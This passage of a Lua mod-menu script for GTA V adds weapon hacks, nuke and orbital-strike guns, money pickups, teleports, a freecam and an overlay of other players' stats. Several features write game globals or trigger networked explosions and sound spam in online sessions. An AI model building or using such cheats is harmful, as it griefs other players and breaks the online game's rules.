	if f.on then
		while f.on do
			system.yield(0)
			if player.is_player_free_aiming(player.player_id()) then
				graphics.set_next_ptfx_asset("weap_xs_vehicle_weapons")
				while not graphics.has_named_ptfx_asset_loaded("weap_xs_vehicle_weapons") do
					graphics.request_named_ptfx_asset("weap_xs_vehicle_weapons")
					system.yield(0)
				end
				if meteor_entities["Flamethrower"] == nil then
					utilities.request_model(gameplay.get_hash_key("prop_alien_egg_01"))
					meteor_entities["Flamethrower"] = object.create_object(gameplay.get_hash_key("prop_alien_egg_01"), player.get_player_coords(player.player_id()), true, false)
					entity.set_entity_collision(meteor_entities["Flamethrower"], false, false, false)
					entity.set_entity_visible(meteor_entities["Flamethrower"], false)
					streaming.set_model_as_no_longer_needed(gameplay.get_hash_key("prop_alien_egg_01"))
				end
				local success, pos_h = ped.get_ped_bone_coords(player.get_player_ped(player.player_id()), 0xdead, v3())
				while not success do
					system.yield(0)
					success, pos_h = ped.get_ped_bone_coords(player.get_player_ped(player.player_id()), 0xdead, v3())
				end
				entity.set_entity_coords_no_offset(meteor_entities["Flamethrower"], pos_h)
				entity.set_entity_rotation(meteor_entities["Flamethrower"], cam.get_gameplay_cam_rot())
				if ptfxs["Flamethrower"] == nil then
					ptfxs["Flamethrower"] = graphics.start_networked_ptfx_looped_on_entity("muz_xs_turret_flamethrower_looping", meteor_entities["Flamethrower"], v3(), v3(), f.value)
					graphics.set_ptfx_looped_scale(ptfxs["Flamethrower"], f.value)
				end
			else
				if meteor_entities["Flamethrower"] then
					graphics.remove_particle_fx(ptfxs["Flamethrower"], true)
					ptfxs["Flamethrower"] = nil
					entity.delete_entity(meteor_entities["Flamethrower"])
					meteor_entities["Flamethrower"] = nil
				end
			end
		end
	end
	if not f.on then
		if ptfxs["Flamethrower"] then
			graphics.remove_particle_fx(ptfxs["Flamethrower"], true)
			ptfxs["Flamethrower"] = nil
			entity.delete_entity(meteor_entities["Flamethrower"])
			meteor_entities["Flamethrower"] = nil
		end
		graphics.remove_named_ptfx_asset("weap_xs_vehicle_weapons")
	end
end)
feature["Flamethrower"].max = 5
feature["Flamethrower"].min = 0.5
feature["Flamethrower"].mod = 0.5
feature["Flamethrower"].value = 0.5

feature["Kill As Orbital Cannon"] = menu.add_feature("Kill As Orbital Cannon", "toggle", localparents["Weapon Modifiers"].id, function(f)
	while f.on do
		if script.get_global_i(2689235 + 1 + (player.player_id() * 453) + 416) & 1 << 0 == 0 and network.is_session_started() then
			script.set_global_i(2689235 + 1 + (player.player_id() * 453) + 416, script.get_global_i(2689235 + 1 + (player.player_id() * 453) + 416) | 1 << 0)
		end
		system.yield(0)
	end
	script.set_global_i(2689235 + 1 + (player.player_id() * 453) + 416, script.get_global_i(2689235 + 1 + (player.player_id() * 453) + 416) & ~1 << 0)
end)

localparents["Projectile Speed"] = menu.add_feature("Projectile Speed", "parent", localparents["Weapon Modifiers"].id)

feature["Remove Projectile Speed"] = menu.add_feature("Remove Projectile Speed", "toggle", localparents["Projectile Speed"].id, function(f)
	while f.on do
		if ped.is_ped_shooting(player.get_player_ped(player.player_id())) and not player.is_player_in_any_vehicle(player.player_id()) then
			natives.CLEAR_AREA_OF_PROJECTILES(player.get_player_coords(player.player_id()), 2.0, 0)
			local v3_start, v3_end = utilities.get_current_shooting_direction()
			gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, ped.get_current_ped_weapon(player.get_player_ped(player.player_id())), player.get_player_ped(player.player_id()), true, false, 0.00000000001)
		end
		system.yield(0)
	end
end)

feature["Fast Projectile Speed"] = menu.add_feature("Fast Projectile Speed", "toggle", localparents["Projectile Speed"].id, function(f)
	while f.on do
		if ped.is_ped_shooting(player.get_player_ped(player.player_id())) and not player.is_player_in_any_vehicle(player.player_id()) then
			natives.CLEAR_AREA_OF_PROJECTILES(player.get_player_coords(player.player_id()), 2.0, 0)
			local v3_start, v3_end = utilities.get_current_shooting_direction()
			gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, ped.get_current_ped_weapon(player.get_player_ped(player.player_id())), player.get_player_ped(player.player_id()), true, false, 2147483647.0)
		end
		system.yield(0)
	end
end)

feature["Modify Projectile Speed"] = menu.add_feature("Modify Projectile Speed", "slider", localparents["Projectile Speed"].id, function(f)
	while f.on do
		if ped.is_ped_shooting(player.get_player_ped(player.player_id())) and not player.is_player_in_any_vehicle(player.player_id()) then
			natives.CLEAR_AREA_OF_PROJECTILES(player.get_player_coords(player.player_id()), 2.0, 0)
			local v3_start, v3_end = utilities.get_current_shooting_direction()
			gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, ped.get_current_ped_weapon(player.get_player_ped(player.player_id())), player.get_player_ped(player.player_id()), true, false, tonumber(f.value))
		end
		system.yield(0)
	end
end)
feature["Modify Projectile Speed"].max = 501
feature["Modify Projectile Speed"].min = 1
feature["Modify Projectile Speed"].mod = 5
feature["Modify Projectile Speed"].value = 1

feature["Backfire Projectiles"] = menu.add_feature("Backfire Projectile", "toggle", localparents["Projectile Speed"].id, function(f)
	while f.on do
		if ped.is_ped_shooting(player.get_player_ped(player.player_id())) and not player.is_player_in_any_vehicle(player.player_id()) then
			natives.CLEAR_AREA_OF_PROJECTILES(player.get_player_coords(player.player_id()), 2.0, 0)
			local v3_start, v3_end = utilities.get_current_shooting_direction()
			gameplay.shoot_single_bullet_between_coords(v3_start, v3_end, 1, ped.get_current_ped_weapon(player.get_player_ped(player.player_id())), player.get_player_ped(player.player_id()), true, false, -500.0)
		end
		system.yield(0)
	end
end)

localparents["Explosion Modifier"] = menu.add_feature("Explosion Modifier", "parent", localparents["Weapon Modifiers"].id)

feature["Size Multiplier"] = menu.add_feature("Size Multiplier", "slider", localparents["Explosion Modifier"].id, function(f)
	while f.on do
		for i = 1, #DataMain.all_weapon_hashes do
			natives.SET_WEAPON_EXPLOSION_RADIUS_MULTIPLIER(DataMain.all_weapon_hashes[i], f.value / 10)
		end
		system.yield(10)
	end
	for i = 1, #DataMain.all_weapon_hashes do
		natives.SET_WEAPON_EXPLOSION_RADIUS_MULTIPLIER(DataMain.all_weapon_hashes[i], 1.0)
	end
end)
feature["Size Multiplier"].max = 200
feature["Size Multiplier"].min = 1
feature["Size Multiplier"].mod = 5
feature["Size Multiplier"].value = 1

feature["Mine Impact Gun"] = menu.add_feature("Mine Impact Gun", "value_str", localparents["Weapon Modifiers"].id, function(f)
	while f.on do
		system.yield(0)
		if ped.is_ped_shooting(player.get_player_ped(player.player_id())) then
			local success, pos = ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id()))
			while not success do
				success, pos = ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id()))
				system.yield(0)
			end
			fire.add_explosion(pos + v3(0, 0, 1), f.value + 64, true, false, 0, player.get_player_ped(player.player_id()))
		end
	end
end)
feature["Mine Impact Gun"]:set_str_data({"Kinetic", "EMP", "Spike", "Slick", "Tar"})

feature["Orbital Strike Gun"] = menu.add_feature("Orbital Strike Gun", "toggle", localparents["Weapon Modifiers"].id, function(f)
	while f.on do
		system.yield(0)
		if ped.is_ped_shooting(player.get_player_ped(player.player_id())) then
			local success, pos = ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id()))
			while not success do
				success, pos = ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id()))
				system.yield(0)
			end
			entity_func.create_orbital_cannon_explosion(pos + v3(0, 0, 1), true)
		end
	end
end)

feature["Nuke Gun"] = menu.add_feature("Nuke Gun", "toggle", localparents["Weapon Modifiers"].id, function(f)
	while f.on do
		system.yield(0)
		if ped.is_ped_shooting(player.get_player_ped(player.player_id())) then
			utilities.request_model(gameplay.get_hash_key("tr_prop_tr_military_pickup_01a"))
			local nuke_gun_object_nuke = object.create_object(gameplay.get_hash_key("tr_prop_tr_military_pickup_01a"), player.get_player_coords(player.player_id()) + v3(0, 0, 4), true, true)
			if nuke_gun_object_nuke then
				local vectorV3 = utilities.get_current_aim_velocity_vector()
				entity.apply_force_to_entity(nuke_gun_object_nuke, 3, vectorV3.x * 5, vectorV3.y * 5, vectorV3.z * 5, 0.0, 0.0, 0.0, true, true)
				while nuke_gun_object_nuke and f.on do
					system.yield(10)
					if entity.is_an_entity(nuke_gun_object_nuke) and not entity.is_entity_in_water(nuke_gun_object_nuke) and entity.has_entity_collided_with_anything(nuke_gun_object_nuke) then
						local pos = entity.get_entity_coords(nuke_gun_object_nuke)
						local peds = ped.get_all_peds()
						entity_func.hard_remove_entity(nuke_gun_object_nuke)
						nuke_gun_object_nuke = nil
						entity_func.create_nuke_explosion(pos, true)
					elseif entity.is_entity_in_water(nuke_gun_object_nuke) then
						entity_func.hard_remove_entity(nuke_gun_object_nuke)
						nuke_gun_object_nuke = nil
					end
					if not f.on then
						entity_func.hard_remove_entity(nuke_gun_object_nuke)
						nuke_gun_object_nuke = nil
					end
				end
			end
		end
	end
end)

feature["Money Gun"] = menu.add_feature("Money Gun", "value_str", localparents["Weapon Modifiers"].id, function(f)
	while f.on do
		system.yield(0)
		if ped.is_ped_shooting(player.get_player_ped(player.player_id())) then
			local success, pos = ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id()))
			while not success do
				success, pos = ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id()))
				system.yield(0)
			end
			if f.value == 0 then
				utilities.request_model(gameplay.get_hash_key("p_poly_bag_01_s"))
				natives.CREATE_MONEY_PICKUPS(pos + v3(0, 0, 1), 2000, 1, gameplay.get_hash_key("p_poly_bag_01_s"))
			elseif f.value == 1 then
				utilities.request_model(gameplay.get_hash_key("p_poly_bag_01_s"))
				natives.CREATE_AMBIENT_PICKUP(gameplay.get_hash_key("PICKUP_PORTABLE_CRATE_FIXED_INCAR_SMALL"), pos + v3(0, 0, 0.2), 1, 0, gameplay.get_hash_key("p_poly_bag_01_s"), true, true)
			elseif f.value == 2 and not network.is_session_started() then
				utilities.request_model(gameplay.get_hash_key("prop_security_case_01"))
				natives.CREATE_MONEY_PICKUPS(pos + v3(0, 0, 1), 2100000000, 1, gameplay.get_hash_key("prop_security_case_01"))
			end
		end
	end
end)
feature["Money Gun"]:set_str_data({"Real", "Fake", "2.1B Pickup (SP)"})

feature["40.000 KW Basskanone"] = menu.add_feature("40.000 KW Basskanone", "toggle", localparents["Weapon Modifiers"].id, function(f)
	while f.on do
		system.yield(0)
		if ped.is_ped_shooting(player.get_player_ped(player.player_id())) then
			local success, pos = ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id()))
			while not success do
				success, pos = ped.get_ped_last_weapon_impact(player.get_player_ped(player.player_id()))
				system.wait(0)
			end
			fire.add_explosion(pos, 70, true, false, 0.2, player.get_player_ped(player.player_id()))
			if network.is_session_started() then
				local time = utils.time_ms() + 100
				while time > utils.time_ms() do
					for i = 1, 10 do
						audio.play_sound_from_coord(-1, "Event_Message_Purple", pos, "GTAO_FM_Events_Soundset", true, 5, false)
					end
					system.wait(0)
				end
			end
		end
	end
end)

localparents["Teleporter"] = menu.add_feature("Teleporter", "parent", localparents["Local"].id)

feature["Save Current Position"] = menu.add_feature("Save Current Position", "toggle", localparents["Teleporter"].id, function(f)
	if f.on then
		if player.is_player_in_any_vehicle(player.player_id()) then
			SaveCurrentPosition = entity.get_entity_coords(player.get_player_vehicle(player.player_id()))
		else
			SaveCurrentPosition = player.get_player_coords(player.player_id())
		end
	end
	if not f.on then
		if SaveCurrentPosition then
			if player.is_player_in_any_vehicle(player.player_id()) then
				entity.set_entity_coords_no_offset(player.get_player_vehicle(player.player_id()), SaveCurrentPosition)
			else
				entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), SaveCurrentPosition)
			end
			SaveCurrentPosition = nil
		end
	end
end)

local LocationFeatures = {}

localparents["Custom Locations"] = menu.add_feature("Custom Locations", "parent", localparents["Teleporter"].id)

feature["Save Current Location"] = menu.add_feature("Save Current Location", "action", localparents["Custom Locations"].id, function(f)
	if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt")) then
		local input_stat, input_val = input.get("Enter Location Name", "", 16, 0)
		if input_stat == 1 then
			return HANDLER_CONTINUE
		end
		if input_stat == 2 then
			return HANDLER_POP
		end
		if not string.find(input_val, "|") then
			text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "a"), text_func.generate_random_id() .. "|" .. tostring(input_val) .. "|" .. tostring(player.get_player_coords(player.player_id()).x) .. "|" .. tostring(player.get_player_coords(player.player_id()).y) .. "|" .. tostring(player.get_player_coords(player.player_id()).z) .. "\n")
			menu.notify("Successfully saved location to file!", AddictScript, 4, NotifyColours["green"])
		end
	end
end)

feature["Refresh Locations"] = menu.add_feature("Refresh Locations", "action", localparents["Custom Locations"].id, function(f)
	for k, v in pairs(LocationFeatures) do
		if LocationFeatures[k] then
			menu.delete_feature(LocationFeatures[k].id)
		end
	end
	local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "r")
	for line in file:lines() do
		if string.find(line, "|") then
			local parts = text_func.split_string(line, "|")
			local id = parts[1]
			local name = parts[2]
			local xpos = tonumber(parts[3])
			local ypos = tonumber(parts[4])
			local zpos = tonumber(parts[5])
			LocationFeatures[id] = menu.add_feature(tostring(name), "action_value_str", localparents["Saved Locations"].id, function(f)
				if f.value == 0 then
					if player.is_player_in_any_vehicle(player.player_id()) then
						entity.set_entity_coords_no_offset(player.get_player_vehicle(player.player_id()), v3(xpos, ypos, zpos))
					else
						entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(xpos, ypos, zpos))
					end
				else
					if LocationFeatures[id] then
						menu.delete_feature(LocationFeatures[id].id)
					end
					system.yield(0)
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt")) then
						local finalstring = ""
						local file2 = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "r")
						for line2 in file2:lines() do
							if not string.find(line2, id) then
								finalstring = finalstring .. line2.. "\n"
							end
						end
						system.yield(0)
						text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "w"), "")
						system.yield(0)
						if finalstring ~= "" then
							text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "a"), finalstring)
						end
					end
				end
			end)
			LocationFeatures[id]:set_str_data({"Teleport", "Remove"})
		end
	end
end)

localparents["Saved Locations"] = menu.add_feature("Saved Locations", "parent", localparents["Custom Locations"].id)

do
	local file = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "r")
	for line in file:lines() do
		if string.find(line, "|") then
			local parts = text_func.split_string(line, "|")
			local id = parts[1]
			local name = parts[2]
			local xpos = tonumber(parts[3])
			local ypos = tonumber(parts[4])
			local zpos = tonumber(parts[5])
			LocationFeatures[id] = menu.add_feature(tostring(name), "action_value_str", localparents["Saved Locations"].id, function(f)
				if f.value == 0 then
					if player.is_player_in_any_vehicle(player.player_id()) then
						entity.set_entity_coords_no_offset(player.get_player_vehicle(player.player_id()), v3(xpos, ypos, zpos))
					else
						entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v3(xpos, ypos, zpos))
					end
				else
					if LocationFeatures[id] then
						menu.delete_feature(LocationFeatures[id].id)
					end
					if utils.file_exists(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt")) then
						local finalstring = ""
						local file2 = io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "r")
						for line2 in file2:lines() do
							if not string.find(line2, id) then
								finalstring = finalstring .. line2.. "\n"
							end
						end
						text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "w"), "")
						if finalstring ~= "" then
							text_func.write(io.open(utils.get_appdata_path(Paths.AddictScriptCfg.Data, "TeleportLocations.txt"), "a"), finalstring)
						end
					end
				end
			end)
			LocationFeatures[id]:set_str_data({"Teleport", "Remove"})
		end
	end
end

do
	for k, v in pairs(DataMain.Teleport) do
		localparents["Teleport " .. v[1]] = menu.add_feature(v[1], "parent", localparents["Teleporter"].id)
		for i = 3, #v do
			menu.add_feature(v[2] .. i - 2, "action", localparents["Teleport " .. v[1]].id, function(f)
				if player.is_player_in_any_vehicle(player.player_id()) then
					entity.set_entity_coords_no_offset(player.get_player_vehicle(player.player_id()), v[i])
				else
					entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), v[i])
				end
			end)
		end
	end
end

localparents["Misc"] = menu.add_feature("Misc", "parent", localparents["Local"].id)

menu.add_feature("GTA1 Mode", "toggle", localparents["Misc"].id, function(f)	
	if f.on then
		local cam_ = natives.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", player.get_player_coords(player.player_id()), -90.0, 0.0, 0.0, 70.0, false, false)
		natives.SET_CAM_ACTIVE(cam_, true)
		natives.RENDER_SCRIPT_CAMS(true, true, 0, true, true, 0)
		natives.ATTACH_CAM_TO_ENTITY(cam_, player.get_player_ped(player.player_id()), 0.0, 0.0, 30.0, false)
		while f.on do
			natives.SET_CAM_ROT(cam_, -90.0, 0.0, entity.get_entity_heading(player.get_player_ped(player.player_id())), 2)
			system.yield(0)
		end
		natives.SET_CAM_ACTIVE(cam_, false)
		natives.RENDER_SCRIPT_CAMS(false, false, 0, false, false, false)
		natives.DESTROY_CAM(cam_, false)
	end
end)

feature["Change Phone Style"] = menu.add_feature("Change Phone Style", "value_str", localparents["Misc"].id, function(f)
	local is_open = false
	while f.on do
		if script_func.is_phone_open() then
			if f.value ~= 3 then
				natives.CREATE_MOBILE_PHONE(math.tointeger(f.value))
			end
			is_open = true
		elseif is_open then
			natives.DESTROY_MOBILE_PHONE()
			is_open = false
		end
		system.yield(0)
	end
	natives.CREATE_MOBILE_PHONE(0)
	natives.DESTROY_MOBILE_PHONE()
end)
feature["Change Phone Style"]:set_str_data({"Michael's Phone", "Trevor's Phone", "Franklin's Phone", "unk", "Prologue Phone"})

localparents["Freecam"] = menu.add_feature("Freecam", "parent", localparents["Misc"].id)

menu.add_feature("Enable Freecam", "toggle", localparents["Freecam"].id, function(f)
	if f.on then
		freecam_player_cam = natives.CREATE_CAM_WITH_PARAMS("DEFAULT_SCRIPTED_CAMERA", player.get_player_coords(player.player_id()).x, player.get_player_coords(player.player_id()).y, player.get_player_coords(player.player_id()).z + 2.0, cam.get_gameplay_cam_rot().x, cam.get_gameplay_cam_rot().y, cam.get_gameplay_cam_rot().z, 70.0, false, false)
		natives.SET_CAM_ACTIVE(freecam_player_cam, true)
		natives.RENDER_SCRIPT_CAMS(true, true, 1000, true, true, 0)
		while f.on do
			system.yield(0)
			natives.DISABLE_ALL_CONTROL_ACTIONS(0)
			for i = 0, 6 do
				natives.ENABLE_CONTROL_ACTION(0, i, true)
			end
			for i = 199, 202 do
				natives.ENABLE_CONTROL_ACTION(0, i, true)
			end
			for i = 14, 15 do
				natives.ENABLE_CONTROL_ACTION(0, i, true)
			end
			natives.ENABLE_CONTROL_ACTION(0, 177, true)
			natives.ENABLE_CONTROL_ACTION(0, 237, true)
			natives.ENABLE_CONTROL_ACTION(0, 20, true)
			natives.ENABLE_CONTROL_ACTION(0, 246, true)
			natives.ENABLE_CONTROL_ACTION(0, 245, true)
			if player.is_player_in_any_vehicle(player.player_id()) then
				natives.REQUEST_ADDITIONAL_COLLISION_AT_COORD(entity.get_entity_coords(player.get_player_vehicle(player.player_id())))
			end
			natives.REQUEST_ADDITIONAL_COLLISION_AT_COORD(player.get_player_coords(player.player_id()))
			natives.SET_CAM_ROT(freecam_player_cam, cam.get_gameplay_cam_rot().x, cam.get_gameplay_cam_rot().y, cam.get_gameplay_cam_rot().z, 2)
			if feature["Freecam Hide HUD"].on then
				ui.hide_hud_and_radar_this_frame()
			end
			if feature["Draw Line"].on then
				ui.draw_line(natives.GET_CAM_COORD(freecam_player_cam) - v3(0, 0, 1), player.get_player_coords(player.player_id()), 255, 25, 25, 175)
			end
			if controls.is_disabled_control_pressed(0, 32) then
				local dir = natives.GET_CAM_ROT(freecam_player_cam, 2)
				dir:transformRotToDir()
				natives.SET_CAM_COORD(freecam_player_cam, (natives.GET_CAM_COORD(freecam_player_cam) + dir * feature["Freecam Speed"].value).x, (natives.GET_CAM_COORD(freecam_player_cam) + dir * feature["Freecam Speed"].value).y, (natives.GET_CAM_COORD(freecam_player_cam) + dir * feature["Freecam Speed"].value).z)
			end
			if controls.is_disabled_control_pressed(0, 35) then
				local dir = natives.GET_CAM_ROT(freecam_player_cam, 2) - v3(0, 0, 90)
				dir:transformRotToDir()
				natives.SET_CAM_COORD(freecam_player_cam, (natives.GET_CAM_COORD(freecam_player_cam) + dir * feature["Freecam Speed"].value).x, (natives.GET_CAM_COORD(freecam_player_cam) + dir * feature["Freecam Speed"].value).y, (natives.GET_CAM_COORD(freecam_player_cam) + dir * feature["Freecam Speed"].value).z)
			end
			if controls.is_disabled_control_pressed(0, 34) then
				local dir = natives.GET_CAM_ROT(freecam_player_cam, 2) + v3(0, 0, 90)
				dir:transformRotToDir()
				natives.SET_CAM_COORD(freecam_player_cam, (natives.GET_CAM_COORD(freecam_player_cam) + dir * feature["Freecam Speed"].value).x, (natives.GET_CAM_COORD(freecam_player_cam) + dir * feature["Freecam Speed"].value).y, (natives.GET_CAM_COORD(freecam_player_cam) + dir * feature["Freecam Speed"].value).z)
			end
			if controls.is_disabled_control_pressed(0, 33) then
				local dir = natives.GET_CAM_ROT(freecam_player_cam, 2)
				dir:transformRotToDir()
				natives.SET_CAM_COORD(freecam_player_cam, (natives.GET_CAM_COORD(freecam_player_cam) - dir * feature["Freecam Speed"].value).x, (natives.GET_CAM_COORD(freecam_player_cam) - dir * feature["Freecam Speed"].value).y, (natives.GET_CAM_COORD(freecam_player_cam) - dir * feature["Freecam Speed"].value).z)
			end
			if controls.is_disabled_control_pressed(0, 21) then
				natives.SET_CAM_COORD(freecam_player_cam, (natives.GET_CAM_COORD(freecam_player_cam) + v3(0, 0, 1 * feature["Freecam Speed"].value)).x, (natives.GET_CAM_COORD(freecam_player_cam) + v3(0, 0, 1 * feature["Freecam Speed"].value)).y, (natives.GET_CAM_COORD(freecam_player_cam) + v3(0, 0, 1 * feature["Freecam Speed"].value)).z)
			end
			if controls.is_disabled_control_pressed(0, 36) then
				natives.SET_CAM_COORD(freecam_player_cam, (natives.GET_CAM_COORD(freecam_player_cam) - v3(0, 0, 1 * feature["Freecam Speed"].value)).x, (natives.GET_CAM_COORD(freecam_player_cam) - v3(0, 0, 1 * feature["Freecam Speed"].value)).y, (natives.GET_CAM_COORD(freecam_player_cam) - v3(0, 0, 1 * feature["Freecam Speed"].value)).z)
			end
			natives.SET_FOCUS_POS_AND_VEL(natives.GET_CAM_COORD(freecam_player_cam), 0.0, 0.0, 0.0)
			natives.LOCK_MINIMAP_POSITION(natives.GET_CAM_COORD(freecam_player_cam).x, natives.GET_CAM_COORD(freecam_player_cam).y)
		end
	end
	if not f.on then
		if freecam_player_cam then
			natives.DESTROY_CAM(freecam_player_cam, false)
			natives.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
			freecam_player_cam = nil
		end
		natives.UNLOCK_MINIMAP_POSITION()
		natives.ENABLE_ALL_CONTROL_ACTIONS(0)
		natives.CLEAR_FOCUS()
	end
end)

feature["Freecam Hide HUD"] = menu.add_feature("Hide HUD", "toggle", localparents["Freecam"].id, function(f)
end)

feature["Draw Line"] = menu.add_feature("Draw Line", "toggle", localparents["Freecam"].id, function(f)
end)

feature["Freecam Speed"] = menu.add_feature("Cam Speed", "autoaction_value_f", localparents["Freecam"].id, function(f)
end)
feature["Freecam Speed"].max = 10.0
feature["Freecam Speed"].min = 0.1
feature["Freecam Speed"].mod = 0.1
feature["Freecam Speed"].value = 1.0

localparents["Player Info Tab"] = menu.add_feature("Player Info Tab", "parent", localparents["Misc"].id)

feature["Player Info Tab"] = menu.add_feature("Player Info Tab", "toggle", localparents["Player Info Tab"].id, function(f)
	if f.on then
		while f.on do
			system.yield(0)
			if not script_func.is_phone_open() then
				local pos_y = (feature["Tab 1 Y Position"].value) / 100
				for pid = 0, 15 do
					if player.is_player_valid(pid) then
						ui.set_text_scale(feature["Text Size"].value)
						ui.set_text_font(feature["Text Font"].value)
						ui.set_text_centre(0)
						ui.set_text_outline(true)
						if script_func.get_player_ceo_int(pid) == 10 then
							ui.set_text_color(30, 100, 152, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 9 then
							ui.set_text_color(216, 85, 117, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 8 then
							ui.set_text_color(0, 132, 114, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 7 then
							ui.set_text_color(178, 144, 132, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 6 then
							ui.set_text_color(181, 214, 234, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 5 then
							ui.set_text_color(141, 206, 167, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 4 then
							ui.set_text_color(160, 140, 193, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 3 then
							ui.set_text_color(113, 169, 175, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 2 then
							ui.set_text_color(239, 238, 151, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 1 then
							ui.set_text_color(226, 134, 187, (feature["Tab 1 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 0 then
							ui.set_text_color(247, 159, 123, (feature["Tab 1 Alpha"].value))
						else
							ui.set_text_color(255, 255, 255, (feature["Tab 1 Alpha"].value))
						end
						ui.draw_text("[" .. script_func.get_player_ceo_int(pid) .. "] " .. player_func.get_player_flag_string(pid) .. " " .. player.get_player_name(pid) .. " {ID: " .. pid .. "} {Rank: " .. script_func.get_player_rank(pid) .. "} {" .. script_func.get_player_money_str(pid) .. "} {KD: " .. text_func.round_two_dc(script_func.get_player_kd(pid)) .. "} {Ping: " .. text_func.round(natives.NETWORK_GET_AVERAGE_LATENCY_FOR_PLAYER_2(pid)) .. "} {PkgL: %" .. text_func.round(natives.NETWORK_GET_AVERAGE_PACKET_LOSS_FOR_PLAYER(pid) * 100) .. "}", v2((feature["Tab 1 X Position"].value) / 100, pos_y))
						pos_y = pos_y + 0.017
					end
				end
				local pos_y = (feature["Tab 2 Y Position"].value) / 100
				for pid = 16, 31 do
					if player.is_player_valid(pid) then
						ui.set_text_scale(feature["Text Size"].value)
						ui.set_text_font(feature["Text Font"].value)
						ui.set_text_centre(0)
						ui.set_text_outline(true)
						if script_func.get_player_ceo_int(pid) == 10 then
							ui.set_text_color(30, 100, 152, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 9 then
							ui.set_text_color(216, 85, 117, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 8 then
							ui.set_text_color(0, 132, 114, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 7 then
							ui.set_text_color(178, 144, 132, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 6 then
							ui.set_text_color(181, 214, 234, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 5 then
							ui.set_text_color(141, 206, 167, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 4 then
							ui.set_text_color(160, 140, 193, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 3 then
							ui.set_text_color(113, 169, 175, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 2 then
							ui.set_text_color(239, 238, 151, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 1 then
							ui.set_text_color(226, 134, 187, (feature["Tab 2 Alpha"].value))
						elseif script_func.get_player_ceo_int(pid) == 0 then
							ui.set_text_color(247, 159, 123, (feature["Tab 2 Alpha"].value))
						else
							ui.set_text_color(255, 255, 255, (feature["Tab 2 Alpha"].value))
						end
						ui.draw_text("[" .. script_func.get_player_ceo_int(pid) .. "] " .. player_func.get_player_flag_string(pid) .. " " .. player.get_player_name(pid) .. " {ID: " .. pid .. "} {Rank: " .. script_func.get_player_rank(pid) .. "} {" .. script_func.get_player_money_str(pid) .. "} {KD: " .. text_func.round_two_dc(script_func.get_player_kd(pid)) .. "} {Ping: " .. text_func.round(natives.NETWORK_GET_AVERAGE_LATENCY_FOR_PLAYER_2(pid)) .. "} {PkgL: %" .. text_func.round(natives.NETWORK_GET_AVERAGE_PACKET_LOSS_FOR_PLAYER(pid) * 100) .. "}", v2((feature["Tab 2 X Position"].value) / 100, pos_y))
						pos_y = pos_y + 0.017
					end
				end
			end
		end
	end
end)

feature["Tab 1 X Position"] = menu.add_feature("Tab 1 X Position", "autoaction_value_i", localparents["Player Info Tab"].id, function(f)
end)
feature["Tab 1 X Position"].max = 100
feature["Tab 1 X Position"].min = 0
feature["Tab 1 X Position"].mod = 1
feature["Tab 1 X Position"].value = 35

feature["Tab 2 X Position"] = menu.add_feature("Tab 2 X Position", "autoaction_value_i", localparents["Player Info Tab"].id, function(f)
end)
feature["Tab 2 X Position"].max = 100
feature["Tab 2 X Position"].min = 0
feature["Tab 2 X Position"].mod = 1
feature["Tab 2 X Position"].value = 65

feature["Tab 1 Y Position"] = menu.add_feature("Tab 1 Y Position", "autoaction_value_i", localparents["Player Info Tab"].id, function(f)
end)
